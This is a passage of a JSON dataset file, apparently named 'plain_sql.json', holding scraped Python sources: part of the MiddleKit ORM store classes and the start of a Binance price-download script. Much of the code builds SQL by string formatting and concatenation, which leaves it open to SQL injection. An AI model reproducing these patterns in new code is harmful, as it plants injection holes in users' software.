no such class exists in'\n                        ' the model %s. The model and the db are not in sync.'\n                        % (name, name, filename))\n                    raise KeyError(msg)\n                klassesById[klassId] = klass\n                klass.setId(klassId)\n        finally:\n            self.doneWithConnection(conn)\n        self._klassesById = klassesById\n\n\n    ## Changes ##\n\n    def commitInserts(self, allThreads=False):\n        unknownSerialNums = []\n        # @@ ... sort here for dependency order\n        for obj in self._newObjects.items(allThreads):\n            self._insertObject(obj, unknownSerialNums)\n        conn = None\n        try:\n            for unknownInfo in unknownSerialNums:\n                stmt = unknownInfo.updateStmt()\n                conn, cur = self.executeSQL(stmt, conn)\n        finally:\n            self.doneWithConnection(conn)\n        self._newObjects.clear(allThreads)\n\n    def _insertObject(self, obj, unknownSerialNums):\n        # New objects not in the persistent store have serial numbers less than 1\n        if obj.serialNum() > 0:\n            try:\n                rep = repr(obj)\n            except Exception:\n                rep = '(repr exception)'\n            assert obj.serialNum() < 1, 'obj=%s' % rep\n\n        # try to get the next ID (if database supports this)\n        idNum = self.retrieveNextInsertId(obj.klass())\n\n        # SQL insert\n        sql = obj.sqlInsertStmt(unknownSerialNums, idNum)\n        conn, cur = self.executeSQL(sql)\n        try:\n            # Get new id/serial num\n            if idNum is None:\n                idNum = self.retrieveLastInsertId(conn, cur)\n\n            # Update object\n            obj.setSerialNum(idNum)\n            obj.setKey(ObjectKey().initFromObject(obj))\n            obj.setChanged(False)\n\n            # Update our object pool\n            self._objects[obj.key()] = obj\n        finally:\n            self.doneWithConnection(conn)\n\n    def retrieveNextInsertId(self, klass):\n        \"\"\"Return the id for the next new object of this class.\n\n        Databases which cannot determine the id until the object has been\n        added return None, signifying that retrieveLastInsertId\n        should be called to get the id after the insert has been made.\n        \"\"\"\n        return None\n\n    def retrieveLastInsertId(self, conn, cur):\n        \"\"\"Return the id of the last INSERT operation by this connection.\n\n        This id is typically a 32-bit int. Used by commitInserts() to get\n        the correct serial number for the last inserted object.\n        \"\"\"\n        return cur.lastrowid\n\n    def commitUpdates(self, allThreads=False):\n        conn = None\n        try:\n            for obj in self._changedObjects.values(allThreads):\n                sql = obj.sqlUpdateStmt()\n                conn, cur = self.executeSQL(sql, conn)\n                obj.setChanged(False)\n        finally:\n            self.doneWithConnection(conn)\n        self._changedObjects.clear(allThreads)\n\n    def commitDeletions(self, allThreads=False):\n        conn = None\n        try:\n            for obj in self._deletedObjects.items(allThreads):\n                sql = obj.sqlDeleteStmt()\n                conn, cur = self.executeSQL(sql, conn)\n                conn.commit()\n        finally:\n            self.doneWithConnection(conn)\n        self._deletedObjects.clear(allThreads)\n\n\n    ## Fetching ##\n\n    def fetchObject(self, aClass, serialNum, default=NoDefault):\n        \"\"\"Fetch a single object of a specific class and serial number.\n\n        aClass can be a Klass object (from the MiddleKit object model),\n        the name of the class (e.g., a string) or a Python class.\n        Raises an exception if aClass parameter is invalid, or the object\n        cannot be located.\n        \"\"\"\n        klass = self._klassForClass(aClass)\n        objects = self.fetchObjectsOfClass(klass, serialNum=serialNum, isDeep=False)\n        count = len(objects)\n        if count == 0:\n            if default is NoDefault:\n                raise UnknownObjectError('aClass = %r, serialNum = %r'\n                    % (aClass, serialNum))\n            else:\n                return default\n        else:\n            assert count == 1\n            return objects[0]\n\n    def fetchObjectsOfClass(self, aClass,\n            clauses='', isDeep=True, refreshAttrs=True, serialNum=None):\n        \"\"\"Fetch a list of objects of a specific class.\n\n        The list may be empty if no objects are found.\n\n        aClass can be a Klass object (from the MiddleKit object model),\n        the name of the class (e.g., a string) or a Python class.\n\n        The clauses argument can be any SQL clauses such as 'where x<5 order by x'.\n        Obviously, these could be specific to your SQL database, thereby making\n        your code non-portable. Use your best judgement.\n\n        serialNum can be a specific serial number if you are looking for\n        a specific object. If serialNum is provided, it overrides the clauses.\n\n        You should label all arguments other than aClass:\n            objs = store.fetchObjectsOfClass('Foo', clauses='where x<5')\n        The reason for labeling is that this method is likely to undergo\n        improvements in the future which could include additional arguments.\n        No guarantees are made about the order of the arguments except that\n        aClass will always be the first.\n        Raises an exception if aClass parameter is invalid.\n        \"\"\"\n        klass = self._klassForClass(aClass)\n\n        # Fetch objects of subclasses first, because the code below\n        # will be  modifying clauses and serialNum\n        deepObjs = []\n        if isDeep:\n            for subklass in klass.subklasses():\n                deepObjs.extend(self.fetchObjectsOfClass(\n                    subklass, clauses, isDeep, refreshAttrs, serialNum))\n\n        # Now get objects of this exact class\n        objs = []\n        if not klass.isAbstract():\n            fetchSQLStart = klass.fetchSQLStart()\n            className = klass.name()\n            if serialNum is not None:\n                serialNum = int(serialNum)  # make sure it's a valid int\n                clauses = 'where %s=%d' % (klass.sqlSerialColumnName(), serialNum)\n            if self._markDeletes:\n                clauses = self.addDeletedToClauses(clauses)\n            conn, cur = self.executeSQL(fetchSQLStart + clauses + ';')\n            try:\n                for row in cur.fetchall():\n                    serialNum = row[0]\n                    key = ObjectKey().initFromClassNameAndSerialNum(className, serialNum)\n                    obj = self._objects.get(key)\n                    if obj is None:\n                        pyClass = klass.pyClass()\n                        obj = pyClass()\n                        assert isinstance(obj, MiddleObject), (\n                            'Not a MiddleObject. obj = %r, type = %r, MiddleObject = %r'\n                                % (obj, type(obj), MiddleObject))\n                        obj.readStoreData(self, row)\n                        obj.setKey(key)\n                        self._objects[key] = obj\n                    else:\n                        # Existing object\n                        if refreshAttrs:\n                            obj.readStoreData(self, row)\n                    objs.append(obj)\n            finally:\n                self.doneWithConnection(conn)\n        objs.extend(deepObjs)\n        return objs\n\n    def refreshObject(self, obj):\n        assert obj.store() is self\n        return self.fetchObject(obj.klass(), obj.serialNum())\n\n\n    ## Klasses ##\n\n    def klassForId(self, id):\n        return self._klassesById[id]\n\n\n    ## Self utility for SQL, connections, cursors, etc. ##\n\n    def executeSQL(self, sql, connection=None, commit=False):\n        \"\"\"Execute the given SQL.\n\n        This will connect to the database for the first time if necessary.\n        This method will also log the SQL to self._sqlEcho, if it is not None.\n        Returns the connection and cursor used and relies on connectionAndCursor()\n        to obtain these. Note that you can pass in a connection to force a\n        particular one to be used and a flag to commit immediately.\n        \"\"\"\n        sql = str(sql)  # Excel-based models yield Unicode strings which some db modules don't like\n        sql = sql.strip()\n        if aggressiveGC:\n            import gc\n            assert gc.isenabled()\n            gc.collect()\n        self._sqlCount += 1\n        if self._sqlEcho:\n            timestamp = funcs.timestamp()['pretty']\n            self._sqlEcho.write('SQL %04i. %s %s\\n' % (self._sqlCount, timestamp, sql))\n            self._sqlEcho.flush()\n        conn, cur = self.connectionAndCursor(connection)\n        self._executeSQL(cur, sql)\n        if commit:\n            conn.commit()\n        return conn, cur\n\n    def _executeSQL(self, cur, sql):\n        \"\"\"Invoke execute on the cursor with the given SQL.\n\n        This is a hook for subclasses that wish to influence this event.\n        Invoked by executeSQL().\n        \"\"\"\n        cur.execute(sql)\n\n    def executeSQLTransaction(self, transaction, connection=None, commit=True):\n        \"\"\"Execute the given sequence of SQL statements and commit as transaction.\"\"\"\n        if isinstance(transaction, basestring):\n            transaction = [transaction]\n        try:\n            for sql in transaction:\n                if connection:\n                    self.executeSQL(sql, connection)\n                else:\n                    connection, cur = self.executeSQL(sql)\n        except Exception:\n            if connection and commit:\n                connection.rollback()\n            raise\n        if transaction and connection and commit:\n            try:\n                connection.commit()\n            except Exception:\n                connection.rollback()\n                raise\n        return connection\n\n    def executeSQLScript(self, sql, connection=None):\n        \"\"\"Execute the given SQL script.\n\n        This uses the nonstandard executescript() method as provided\n        by the PySQLite adapter.\n        \"\"\"\n        sql = str(sql).strip()\n        if not connection:\n            connection = self.newConnection()\n        if not hasattr(connection, 'executescript'):\n            raise AttributeError(\n                'Script execution not supported by database adapter.')\n        return connection.executescript(sql)\n\n    def setSQLEcho(self, file):\n        \"\"\"Set a file to echo sql statements to, as sent through executeSQL().\n\n        None can be passed to turn echo off.\n        \"\"\"\n        self._sqlEcho = file\n\n    def connectionAndCursor(self, connection=None):\n        \"\"\"Return the connection and cursor needed for executing SQL.\n\n        Takes into account factors such as setting('Threaded') and the\n        threadsafety level of the DB API module. You can pass in a connection to\n        force a particular one to be used. Uses newConnection() and connect().\n        \"\"\"\n        if aggressiveGC:\n            import gc\n            assert gc.isenabled()\n            gc.collect()\n        if connection:\n            conn = connection\n        elif self._threaded:\n            if self._pool:\n                conn = self._pool.connection()\n            elif self._threadSafety == 1:\n                conn = self.newConnection()\n            else:  # safety = 2, 3\n                if not self._connected:\n                    self.connect()\n                conn = self._connection\n        else:\n            # Non-threaded\n            if not self._connected:\n                self.connect()\n            conn = self._connection\n        cursor = conn.cursor()\n        return conn, cursor\n\n    def threadSafety(self):\n        \"\"\"Return the threadsafety of the DB API module.\"\"\"\n        return self.dbapiModule().threadsafety\n\n    def dbapiVersion(self):\n        \"\"\"Return the version of the DB API module.\"\"\"\n        module = self.dbapiModule()\n        return '%s %s' % (module.__name__, module.version)\n\n    def dbVersion(self):\n        \"\"\"Return the database version.\n\n        Subclass responsibility.\n        \"\"\"\n        raise AbstractError(self.__class__)\n\n    def addDeletedToClauses(self, clauses):\n        \"\"\"Modify the given set of clauses so that it filters out records with non-NULL deleted field.\"\"\"\n        clauses = clauses.strip()\n        if clauses.lower().startswith('where'):\n            where = clauses[5:]\n            orderByIndex = where.lower().find('order by')\n            if orderByIndex < 0:\n                orderBy = ''\n            else:\n                where, orderBy = where[:orderByIndex], where[orderByIndex:]\n            return 'where deleted is null and (%s) %s' % (where, orderBy)\n        else:\n            return 'where deleted is null %s' % clauses\n\n\n    ## Obj refs ##\n\n    def fetchObjRef(self, objRef):\n        \"\"\"Fetch referenced object.\n\n        Given an unarchived object reference, this method returns the actual\n        object for it (or None if the reference is NULL or dangling). While\n        this method assumes that obj refs are stored as 64-bit numbers containing\n        the class id and object serial number, subclasses are certainly able to\n        override that assumption by overriding this method.\n        \"\"\"\n        assert isinstance(objRef, long), 'type=%r, objRef=%r' % (type(objRef), objRef)\n        if objRef == 0:\n            return None\n        else:\n            klassId, serialNum = objRefSplit(objRef)\n            if klassId == 0 or serialNum == 0:\n                # invalid! we don't use 0 serial numbers\n                return self.objRefZeroSerialNum(objRef)\n\n            klass = self.klassForId(klassId)\n\n            # Check if we already have this in memory first\n            key = ObjectKey()\n            key.initFromClassNameAndSerialNum(klass.name(), serialNum)\n            obj = self._objects.get(key)\n            if obj:\n                return obj\n\n            clauses = 'where %s=%d' % (klass.sqlSerialColumnName(), serialNum)\n            objs = self.fetchObjectsOfClass(klass, clauses, isDeep=False)\n            if len(objs) == 1:\n                return objs[0]\n            elif len(objs) > 1:\n                # @@ 2000-11-22 ce: expand the msg with more information\n                raise ValueError('Multiple objects.')\n            else:\n                return self.objRefDangles(objRef)\n\n    def objRefInMem(self, objRef):\n        \"\"\"Return referenced object in memory.\n\n        Returns the object corresponding to the given objref if and only if it\n        has been loaded into memory. If the object has never been fetched from\n        the database, None is returned.\n        \"\"\"\n        assert isinstance(objRef, long), 'type=%r, objRef=%r' % (type(objRef), objRef)\n        if objRef == 0:\n            return 0\n        else:\n            klassId, serialNum = objRefSplit(objRef)\n            if klassId == 0 or serialNum == 0:\n                # invalid! we don't use 0 serial numbers\n                return self.objRefZeroSerialNum(objRef)\n\n            klass = self.klassForId(klassId)\n\n            # return whether we have this object in memory\n            key = ObjectKey()\n            key.initFromClassNameAndSerialNum(klass.name(), serialNum)\n            return self._objects.get(key)\n\n    def objRefZeroSerialNum(self, objRef):\n        \"\"\"Raise serial number zero error.\n\n        Invoked by fetchObjRef() if either the class or the object serial\n        number is zero.\n        \"\"\"\n        raise ObjRefZeroSerialNumError(objRefSplit(objRef))\n\n    def objRefDangles(self, objRef):\n        \"\"\"Raise dangling reference error.\n\n        Invoked by fetchObjRef() if there is no possible target object\n        for the given objRef.\n\n        E.g., this can happen for a dangling reference. This method invokes\n        self.warning() and includes the objRef as decimal, hexadecimal\n        and class:obj numbers.\n        \"\"\"\n        raise ObjRefDanglesError(objRefSplit(objRef))\n\n\n    ## Special Cases ##\n\n    def filterDateTimeDelta(self, dtd):\n        \"\"\"Adapt DateTimeDeltas.\n\n        Some databases have no TIME type and therefore will not return\n        DateTimeDeltas. This utility method is overridden by subclasses\n        as appropriate and invoked by the test suite.\n        \"\"\"\n        return dtd\n\n    def sqlNowCall(self):\n        \"\"\"Get current DateTime.\"\"\"\n        return 'CURRENT_TIMESTAMP'\n\n\n    ## Self util ##\n\n    def doneWithConnection(self, conn):\n        \"\"\"Invoked by self when a connection is no longer needed.\n\n        The default behavior is to commit and close the connection.\n        \"\"\"\n        if conn is not None:\n            # Starting with 1.2.0, MySQLdb disables autocommit by default,\n            # as required by the DB-API standard (PEP-249). If you are using\n            # InnoDB tables or some other type of transactional table type,\n            # you'll need to do connection.commit() before closing the connection,\n            # or else none of your changes will be written to the database.\n            try:\n                conn.commit()\n            except Exception:\n                pass\n            conn.close()\n\n\n    ## Debugging ##\n\n    def dumpTables(self, out=None):\n        if out is None:\n            out = sys.stdout\n        out.write('DUMPING TABLES\\n')\n        out.write('BEGIN\\n')\n        conn = None\n        try:\n            for klass in self.model().klasses().values():\n                out.write(klass.name() + '\\n')\n                conn, cur = self.executeSQL('select * from %s;'\n                    % klass.name(), conn)\n                out.write(str(self._cursor.fetchall()))\n                out.write('\\n')\n        finally:\n            self.doneWithConnection(conn)\n        out.write('END\\n')\n\n    def dumpKlassIds(self, out=None):\n        if out is None:\n            out = sys.stdout\n        wr = out.write('DUMPING KLASS IDs\\n')\n        for klass in self.model().klasses().values():\n            out.write('%25s %2i\\n' % (klass.name(), klass.id()))\n        out.write('\\n')\n\n    def dumpObjectStore(self, out=None, progress=False):\n        if out is None:\n            out = sys.stdout\n        for klass in self.model().klasses().values():\n            if progress:\n                sys.stderr.write(\".\")\n            out.write('%s objects\\n' % (klass.name()))\n            attrs = [attr for attr in klass.allAttrs() if attr.hasSQLColumn()]\n            colNames = [attr.name() for attr in attrs]\n            colNames.insert(0, klass.sqlSerialColumnName())\n            out.write(CSVJoiner.joinCSVFields(colNames) + \"\\n\")\n\n            # write out a line for each object in this class\n            objlist = self.fetchObjectsOfClass(klass.name(), isDeep=False)\n            for obj in objlist:\n                fields = []\n                fields.append(str(obj.serialNum()))\n                for attr in attrs:\n                    # jdh 2003-03-07: if the attribute is a dangling object reference, the value\n                    # will be None.  This means that dangling references will _not_ be remembered\n                    # across dump/generate/create/insert procedures.\n                    method = getattr(obj, attr.pyGetName())\n                    value = method()\n                    if value is None:\n                        fields.append('')\n                    elif isinstance(value, MiddleObject):\n                        fields.append('%s.%d' % (value.klass().name(),\n                            value.serialNum()))\n                    else:\n                        fields.append(str(value))\n                out.write(CSVJoiner.joinCSVFields(fields).replace('\\r', '\\\\r'))\n\n                out.write('\\n')\n            out.write('\\n')\n        out.write('\\n')\n        if progress:\n            sys.stderr.write(\"\\n\")\n\n\nclass Model(object):\n\n    def sqlDatabaseName(self):\n        \"\"\"Return the name of the database.\n\n        This is either the 'Database' setting or self.name().\n        \"\"\"\n        name = self.setting('Database', None)\n        if name is None:\n            name = self.name()\n        return name\n\n\nclass MiddleObjectMixIn(object):\n\n    def sqlObjRef(self):\n        \"\"\"Return the 64-bit integer value that refers to self in a SQL database.\n\n        This only makes sense if the UseBigIntObjRefColumns setting is True.\n        \"\"\"\n        return objRefJoin(self.klass().id(), self.serialNum())\n\n    def sqlInsertStmt(self, unknowns, id=None):\n        \"\"\"Return SQL insert statements.\n\n        Returns the SQL insert statements for MySQL (as a tuple) in the form:\n            insert into table (name, ...) values (value, ...);\n\n        May add an info object to the unknowns list for obj references that\n        are not yet resolved.\n        \"\"\"\n        klass = self.klass()\n        insertSQLStart, sqlAttrs = klass.insertSQLStart(includeSerialColumn=id)\n        values = []\n        append = values.append\n        extend = values.extend\n        if id is not None:\n            append(str(id))\n        for attr in sqlAttrs:\n            try:\n                value = attr.sqlValue(self.valueForAttr(attr))\n            except UnknownSerialNumberError as exc:\n                exc.info.sourceObject = self\n                unknowns.append(exc.info)\n                if self.store().model().setting('UseBigIntObjRefColumns', False):\n                    value = 'NULL'\n                else:\n                    value = ('NULL', 'NULL')\n            if isinstance(value, basestring):\n                append(value)\n            else:\n                # value could be sequence for attrs requiring multiple SQL columns\n                extend(value)\n        if not values:\n            values = ['0']\n        values = ','.join(values)\n        return insertSQLStart + values + ');'\n\n    def sqlUpdateStmt(self):\n        \"\"\"Return SQL update statement.\n\n        Returns the SQL update statement of the form:\n            update table set name=value, ... where idName=idValue;\n        Installed as a method of MiddleObject.\n        \"\"\"\n        assert self._mk_changedAttrs\n        klass = self.klass()\n        res = []\n        for attr in self._mk_changedAttrs.values():\n            res.append(attr.sqlUpdateExpr(self.valueForAttr(attr)))\n        res = ','.join(res)\n        res = ('update ', klass.sqlTableName(), ' set ', res, ' where ',\n            klass.sqlSerialColumnName(), '=', str(self.serialNum()))\n        return ''.join(res)\n\n    def sqlDeleteStmt(self):\n        \"\"\"Return SQL delete statement.\n\n        Returns the SQL delete statement for MySQL of the form:\n            delete from table where idName=idValue;\n        Or if deletion is being marked with a timestamp:\n            update table set deleted=Now();\n        Installed as a method of MiddleObject.\n        \"\"\"\n        klass = self.klass()\n        assert klass is not None\n        if self.store().model().setting('DeleteBehavior', 'delete') == 'mark':\n            return 'update %s set deleted=%s where %s=%d;' % (\n                klass.sqlTableName(), self.store().sqlNowCall(),\n                klass.sqlSerialColumnName(), self.serialNum())\n        else:\n            return 'delete from %s where %s=%d;' % (klass.sqlTableName(),\n                klass.sqlSerialColumnName(), self.serialNum())\n\n    def referencingObjectsAndAttrsFetchKeywordArgs(self, backObjRefAttr):\n        if self.store().setting('UseBigIntObjRefColumns'):\n            return dict(refreshAttrs=True, clauses='WHERE %s=%s'\n                % (backObjRefAttr.sqlColumnName(), self.sqlObjRef()))\n        else:\n            classIdName, objIdName = backObjRefAttr.sqlColumnNames()\n            return dict(refreshAttrs=True, clauses='WHERE (%s=%s AND %s=%s)'\n                % (classIdName, self.klass().id(), objIdName, self.serialNum()))\n\nMixIn(MiddleObject, MiddleObjectMixIn)\n    # Normally we don't have to invoke MixIn()--it's done automatically.\n    # However, that only works when augmenting MiddleKit.Core classes\n    # (MiddleObject belongs to MiddleKit.Run).\n\n\nimport MiddleKit.Design.KlassSQLSerialColumnName\n\n\nclass Klass(object):\n\n    _fetchSQLStart = None  # help out the caching mechanism in fetchSQLStart()\n    _insertSQLStart = None  # help out the caching mechanism in insertSQLStart()\n\n    def sqlTableName(self):\n        \"\"\"Return the name of the SQL table for this class.\n\n        Returns self.name().\n        Subclasses may wish to override to provide special quoting that\n        prevents name collisions between table names and reserved words.\n        \"\"\"\n        return self.name()\n\n    def fetchSQLStart(self):\n        if self._fetchSQLStart is None:\n            attrs = self.allDataAttrs()\n            attrs = [attr for attr in attrs if attr.hasSQLColumn()]\n            colNames = [self.sqlSerialColumnName()]\n            colNames.extend([attr.sqlColumnName() for attr in attrs])\n            self._fetchSQLStart = 'select %s from %s ' % (','.join(colNames), self.sqlTableName())\n        return self._fetchSQLStart\n\n    def insertSQLStart(self, includeSerialColumn=False):\n        \"\"\"Return a tuple of insertSQLStart (a string) and sqlAttrs (a list).\"\"\"\n        if self._insertSQLStart is None:\n            res = ['insert into %s (' % self.sqlTableName()]\n            attrs = self.allDataAttrs()\n            attrs = [attr for attr in attrs if attr.hasSQLColumn()]\n            fieldNames = [attr.sqlColumnName() for attr in attrs]\n            if includeSerialColumn or len(fieldNames) == 0:\n                fieldNames.insert(0, self.sqlSerialColumnName())\n            res.append(','.join(fieldNames))\n            res.append(') values (')\n            self._insertSQLStart = ''.join(res)\n            self._sqlAttrs = attrs\n        return self._insertSQLStart, self._sqlAttrs\n\n\nclass Attr(object):\n\n    def shouldRegisterChanges(self):\n        \"\"\"Return self.hasSQLColumn().\n\n        This only makes sense since there would be no point in registering\n        changes on an attribute with no corresponding SQL column. The standard\n        example of such an attribute is \"list\".\n        \"\"\"\n        return self.hasSQLColumn()\n\n    def hasSQLColumn(self):\n        \"\"\"Check if there is a correlating SQL column.\n\n        Returns true if the attribute has a direct correlating SQL column in\n        its class' SQL table definition.\n        Most attributes do. Those of type list do not.\n        \"\"\"\n        return not self.get('isDerived', False)\n\n    def sqlColumnName(self):\n        \"\"\"Return the SQL column name corresponding to this attribute-\n\n        This is consisting of self.name() + self.sqlTypeSuffix().\n        \"\"\"\n        if not self._sqlColumnName:\n            self._sqlColumnName = self.name()\n        return self._sqlColumnName\n\n    def sqlValue(self, value):\n        \"\"\"Return SQL for Python value.\n\n        For a given Python value, this returns the correct string for use in a\n        SQL statement. Subclasses will typically *not* override this method,\n        but instead, sqlForNonNone() and on rare occasions, sqlForNone().\n        \"\"\"\n        if value is None:\n            return self.sqlForNone()\n        else:\n            return self.sqlForNonNone(value)\n\n    def sqlForNone(self):\n        return 'NULL'\n\n    def sqlForNonNone(self, value):\n        return repr(value)\n\n    def sqlUpdateExpr(self, value):\n        \"\"\"Return update assignments.\n\n        Returns the assignment portion of an UPDATE statement such as:\n            \"foo='bar'\"\n        Using sqlColumnName() and sqlValue(). Subclasses only need to\n        override this if they have a special need (such as multiple columns,\n        see ObjRefAttr).\n        \"\"\"\n        colName = self.sqlColumnName()\n        return colName + '=' + self.sqlValue(value)\n\n    def readStoreDataRow(self, obj, row, i):\n        \"\"\"By default, an attr reads one data value out of the row.\"\"\"\n        value = row[i]\n        obj.setValueForAttr(self, value)\n        return i + 1\n\n\nclass BasicTypeAttr(object):\n    pass\n\n\nclass IntAttr(object):\n\n    def sqlForNonNone(self, value):\n        return str(value)\n        # it's important to use str() since an int might point\n        # to a long (whose repr() would be suffixed with an 'L')\n\n\nclass LongAttr(object):\n\n    def sqlForNonNone(self, value):\n        return str(value)\n\n\nclass DecimalAttr(object):\n\n    def sqlForNonNone(self, value):\n        return str(value)  # repr() will give Decimal(\"3.4\")\n\n\nclass BoolAttr(object):\n\n    def sqlForNonNone(self, value):\n        return '1' if value else '0'  # MySQL and MS SQL will take 1 and 0 for bools\n\n\nclass ObjRefAttr(object):\n\n    def sqlColumnName(self):\n        if not self._sqlColumnName:\n            if self.setting('UseBigIntObjRefColumns', False):\n                self._sqlColumnName = self.name() + 'Id'  # old way: one 64 bit column\n            else:\n                # new way: 2 int columns for class id and obj id\n                self._sqlColumnName = '%s,%s' % self.sqlColumnNames()\n        return self._sqlColumnName\n\n    def sqlColumnNames(self):\n        if not self._sqlColumnNames:\n            assert not self.setting('UseBigIntObjRefColumns', False)\n            name = self.name()\n            classIdName, objIdName = self.setting('ObjRefSuffixes')\n            classIdName = name + classIdName\n            objIdName = name + objIdName\n            self._sqlColumnNames = (classIdName, objIdName)\n        return self._sqlColumnNames\n\n    def sqlForNone(self):\n        if self.setting('UseBigIntObjRefColumns', False):\n            return 'NULL'\n        else:\n            return 'NULL,NULL'\n\n    def sqlForNonNone(self, value):\n        assert isinstance(value, MiddleObject)\n        if value.serialNum() == 0:\n            info = UnknownSerialNumInfo()\n            info.sourceAttr = self\n            info.targetObject = value\n            raise UnknownSerialNumberError(info)\n        else:\n            if self.setting('UseBigIntObjRefColumns', False):\n                return str(value.sqlObjRef())\n            else:\n                return str(value.klass().id()), str(value.serialNum())\n\n    def sqlUpdateExpr(self, value):\n        \"\"\"Return update assignments.\n\n        Returns the assignment portion of an UPDATE statement such as:\n            \"foo='bar'\"\n        Using sqlColumnName() and sqlValue(). Subclasses only need to\n        override this if they have a special need (such as multiple columns,\n        see ObjRefAttr).\n        \"\"\"\n        if self.setting('UseBigIntObjRefColumns', False):\n            colName = self.sqlColumnName()\n            return colName + '=' + self.sqlValue(value)\n        else:\n            classIdName, objIdName = self.sqlColumnNames()\n            if value is None:\n                classId = objId = 'NULL'\n            else:\n                classId = value.klass().id()\n                objId = value.serialNum()\n            return '%s=%s,%s=%s' % (classIdName, classId, objIdName, objId)\n\n    def readStoreDataRow(self, obj, row, i):\n        # This does *not* get called under the old approach of single obj ref columns.\n        # See MiddleObject.readStoreData.\n        classId, objId = row[i], row[i+1]\n        if objId is None:\n            value = None\n        else:\n            value = objRefJoin(classId, objId)\n            # @@ 2004-20-02 ce ^ that's wasteful to join them just so they can be split later,\n            # but it works well with the legacy code\n        obj.setValueForAttr(self, value)\n        return i + 2\n\n\nclass ListAttr(object):\n\n    def hasSQLColumn(self):\n        return False\n\n    def readStoreDataRow(self, obj, row, i):\n        return i\n\n\nclass AnyDateTimeAttr(object):\n\n    def sqlForNonNone(self, value):\n        # Chop off the milliseconds -- SQL databases seem to dislike that.\n        return \"'%s'\" % str(value).split('.', 1)[0]\n\n\nclass DateAttr(object):\n\n    def sqlForNonNone(self, value):\n        # We often get \"YYYY-MM-DD HH:MM:SS\" from datetime, so we split\n        # on space and take the first value to work around that.\n        # This works fine with Python's date class (does no harm).\n        if not isinstance(value, basestring):\n            value = str(value).split(None, 1)[0]\n        return \"'%s'\" % value\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Cito/w4py/blob/74f5a03a63f1a93563502b908474aefaae2abda2",
        "file_path": "/MiddleKit/Run/SQLiteObjectStore.py",
        "source": "import sqlite3 as sqlite\n\nfrom SQLObjectStore import SQLObjectStore\n\n\nclass SQLiteObjectStore(SQLObjectStore):\n    \"\"\"SQLiteObjectStore implements an object store backed by a SQLite database.\n\n    See the SQLite docs or the DB API 2.0 docs for more information:\n      https://docs.python.org/2/library/sqlite3.html\n      https://www.python.org/dev/peps/pep-0249/\n    \"\"\"\n\n    def augmentDatabaseArgs(self, args, pool=False):\n        if not args.get('database'):\n            args['database'] = '%s.db' % self._model.sqlDatabaseName()\n\n    def newConnection(self):\n        kwargs = self._dbArgs.copy()\n        self.augmentDatabaseArgs(kwargs)\n        return self.dbapiModule().connect(**kwargs)\n\n    def dbapiModule(self):\n        return sqlite\n\n    def dbVersion(self):\n        return \"SQLite %s\" % sqlite.sqlite_version\n\n    def _executeSQL(self, cur, sql):\n        try:\n            cur.execute(sql)\n        except sqlite.Warning:\n            if not self.setting('IgnoreSQLWarnings', False):\n                raise\n        except sqlite.OperationalError as e:\n            if 'database is locked' in str(e):\n                print ('Please consider installing a newer SQLite version'\n                    ' or increasing the timeout.')\n            raise\n\n    def sqlNowCall(self):\n        return \"datetime('now')\"\n\n\nclass StringAttr(object):\n\n    def sqlForNonNone(self, value):\n        return \"'%s'\" % value.replace(\"'\", \"''\")\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/georg-un/binance-bot/blob/f14f2417a359d5d7f118c7520909b857e120fe31",
        "file_path": "/get_historical_data.py",
        "source": "# LOAD LIBRARIES & FILES\n\n# load libraries\nfrom binance.client import Client\nimport configparser\nimport sqlite3\n\n\n# load functions\ndef getlist(option, sep=',', chars=None):\n    \"\"\"Return a list from a ConfigParser option. By default,\n       split on a comma and strip whitespaces.\"\"\"\n    return [ chunk.strip(chars) for chunk in option.split(sep) ]\n\n\n# READ FILES\n\n# read credentials\nconfigParser = configparser.ConfigParser()\nconfigParser.read(r'credentials/API-key')\n\napi_key = configParser.get('credentials', 'api_key')\napi_sec = configParser.get('credentials', 'api_secret')\n\n\n# read config\nconfigParser.read(r'config.txt')\n\ndb_path = configParser.get('config', 'db_path')\nverbose = configParser.get('config', 'verbose')\nsymbols = getlist(configParser.get('symbols', 'symbol_list'))\nintervals = getlist(configParser.get('intervals', 'interval_list'))\ntime_start = configParser.get('time', 'time_start')\ntime_end = configParser.get('time', 'time_end')\n\n\n# create timestamps for beginning and now\nif time_start == 'beginning':\n    time_start = 'January 1, 2000'\n\n\n# SET UP DATABASE CONNECTION AND BINANCE CLIENT\n\n# connect to database\ndb_con = sqlite3.connect(db_path)\n\n# cet up binance client\nclient = Client(api_key, api_sec)\n\n\n# GET DATA FOR ALL SYMBOLS AND INTERVALS\n\n# Loop over every symbol and every interval. Download historical data for each combination from binance.com which is not\n# already in the database and write it to the database\nfor symbol in symbols:\n    for interval in intervals:\n\n        # define name of table in database\n        table_name = (symbol + '_' + interval, )\n\n        # check if table already exists\n        with db_con:\n            cur = db_con.cursor()\n            cur.execute(\"SELECT name FROM sqlite_master WHERE type='table' AND name=?\", table_name)\n            if cur.fetchone() is None:\n                table_exists = False\n            else:\n                table_exists = True\n\n        # if table does not exist yet, create it and download all historical data.\n        # Note: the SQL-command 'IF NOT EXISTS' has no use here since get_historical_klines()\n        # cannot be used to update existing data\n        if not table_exists:\n            # create table\n            with db_con:\n                cur = db_con.cursor()\n                cur.execute('CREATE TABLE {}_{}('.format(symbol, interval) +\n                            't_open DATETIME, ' +\n                            'open FLOAT, ' +\n                            'high FLOAT, ' +\n                            'low FLOAT, ' +\n                            'close FLOAT, ' +\n                            'vol FLOAT, ' +\n                            't_close DATETIME, ' +\n                            'u_vol FLOAT, ' +\n                            'no_trds INT, ' +\n                            'tbBav FLOAT, ' +\n                            'tbQav FLOAT)')\n\n            # download data\n            output = client.get_historical_klines(symbol=symbol,\n                                                  interval=interval,\n                                                  start_str=time_start,\n                                                  end_str=time_end)\n\n            # write downloaded data to database\n            with db_con:\n                cur = db_con.cursor()\n                for x in range(0, len(output)):\n                    cur.execute('INSERT INTO {}_{} '.format(symbol, interval) +\n                                'VALUES({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {})'.format(output[x][0],\n                                                                                            output[x][1],\n                                                                                            output[x][2],\n                                                                                            output[x][3],\n                                                                                            output[x][4],\n                                                                                            output[x][5],\n                                                                                            output[x][6],\n                                                                                            output[x][7],\n                                                                                            output[x][8],\n                                                                                            output[x][9],\n                                                                                            output[x][10]))\n\n            # print process to console if verbose mode is enabled\n            if verbose:\n                print('Symbol {}, interval {}: Historical data has been downloaded and saved to database'.format(symbol, interval))\n\n        # if table already exists and verbose mode is enabled print that to console\n        elif table_exists & (verbose == 'True'):\n            